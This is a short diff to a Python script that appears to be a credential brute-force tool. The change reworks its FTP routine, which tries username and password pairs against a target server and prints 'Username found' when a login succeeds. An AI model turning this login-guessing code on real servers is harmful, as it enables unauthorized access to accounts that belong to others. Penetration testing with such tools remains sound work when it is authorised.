@@ -342,25 +342,24 @@ elif args.service == "ftp":
                 user = user.rstrip()
 
 
-            def connect_ftp():
-                server = ftplib.FTP()
-                if args.verbose in sys.argv:
-                    if args.verbose != "show":
-                        return False
-                    print('\033[1;37m''[+]', user, '_', password)
-                    try:
-                        server.connect(target, port, timeout=10)
-                        server.login(user, password)
-                    except ftplib.error_perm:
-                        pass
-                    else:
-                        print("\n\033[1;92m-----------------------------------------"
-                              "\n Username found:", user,
-                              "\n------------------------------------------")
-                        exit(0)
+                def connect_ftp(target, port, user, password):
+                    server = ftplib.FTP()
+                    if args.verbose in sys.argv:
+                        if args.verbose != "show":
+                            exit(0)
+                        try:
+                            server.connect(target, port, timeout=10)
+                            server.login(user, password)
+                        except ftplib.error_perm:
+                            print('\033[1;37m''[+]', user, '_', password)
+                            pass
+                        else:
+                            print("\n\033[1;92m-----------------------------------------"
+                                  "\n Username found:", user,
+                                  "\n------------------------------------------")
+                            exit(0)
 
-
-            connect_ftp()
+                connect_ftp(target, port, user, password)
     except KeyboardInterrupt:
         print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
         exit(0)
